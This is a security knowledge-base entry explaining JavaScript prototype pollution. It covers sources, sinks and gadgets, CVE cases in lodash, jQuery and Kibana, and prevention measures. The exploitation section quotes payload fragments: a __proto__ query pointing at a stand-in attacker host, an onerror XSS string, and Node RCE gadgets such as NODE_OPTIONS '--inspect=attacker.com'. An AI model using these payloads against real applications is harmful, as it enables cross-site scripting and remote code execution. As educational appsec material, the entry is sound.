---
summary: A JavaScript vulnerability where attacker-controlled input injects properties into Object.prototype via __proto__ or constructor.prototype, chaining with sinks/gadgets to reach DOM XSS (client-side) or RCE (server-side Node.js).
status: active
tags: [security, web, prototype-pollution, appsec]
private: false
---

# Prototype Pollution

Prototype pollution is a JavaScript vulnerability that lets an attacker add arbitrary properties to global object prototypes, which are then inherited by user-defined objects. Alone it is often benign, but chained with a gadget it escalates to DOM XSS in the browser or remote code execution in Node.js.

## The vulnerability
During a recursive merge or property-set, `__proto__` is treated as a getter for an object's prototype rather than a literal key, so `obj.__proto__.evil = 'x'` (or a `constructor.prototype` path) mutates `Object.prototype` itself. All three ingredients must line up: a **source** (attacker-controllable input such as a query string, JSON body, or web message), a **sink** (a function/DOM API enabling execution), and a **gadget** (a property the sink reads but the app never sets, so it falls through to the polluted prototype).

## Exploitation techniques
Classic source payload: `?__proto__[transport_url]=//evil-user.net`. Browser-API gadgets include `fetch()` options — `?__proto__[headers][x-username]=<img/src/onerror=alert(1)>` — and `Object.defineProperty`, whose descriptor inherits a polluted `value`, defeating naive defenses. Server-side, black-box detection uses non-destructive property reflection and side effects: polluting Express `json spaces`, `status` (via http-errors), `parameterLimit`, `exposedHeaders` (cors), or `charset` to flip JSON to UTF-7. RCE gadgets abuse `child_process`: `NODE_OPTIONS="--inspect=attacker.com"`, `fork()` with `execArgv` (`--eval`), or `execSync` with polluted `shell`/`input`/`argv0`.

## Real-world cases (sourced)
- **lodash CVE-2019-10744** — `defaultsDeep` could be tricked via a `constructor` payload to modify `Object.prototype`; fixed in 4.17.12 (earlier `_.merge` was CVE-2018-3721).
- **jQuery (2019)** — `$.extend(true, {}, ...)` recursive merge polluted through `{"__proto__":{"devMode":true}}`; patched in 3.4.0.
- **Kibana CVE-2019-7609** — Michał Bentkowski's prototype-pollution-to-RCE chain.

## Detection & prevention
Freeze prototypes with `Object.freeze(Object.prototype)`; create map-like objects with `Object.create(null)`; use `Map` instead of plain objects; block/skip `__proto__`, `constructor`, and `prototype` keys in merge logic; validate JSON with schemas. PortSwigger's DOM Invader automates client-side gadget discovery.

## Sources
- Prototype pollution — https://portswigger.net/web-security/prototype-pollution
- Server-side prototype pollution — https://portswigger.net/web-security/prototype-pollution/server-side
- Server-side prototype pollution (research) — https://portswigger.net/research/server-side-prototype-pollution
- Prototype pollution via browser APIs — https://portswigger.net/web-security/prototype-pollution/browser-apis
- New jQuery prototype pollution vulnerability (Snyk) — https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/
- Lodash CVE-2019-10744 (Snyk) — https://security.snyk.io/vuln/SNYK-JS-LODASH-450202

## Related
- [Web-Advanced — Index](kb://11-security-web-advanced-web-advanced-index)
- [Web App Testing](kb://11-security-playbook-web-app-testing)
- [Payload Cheat Sheets — Index](kb://11-security-payloads-payloads-index)
- [Security Map](kb://01-maps-security-map)
- [11-security](kb://hub-11-security)
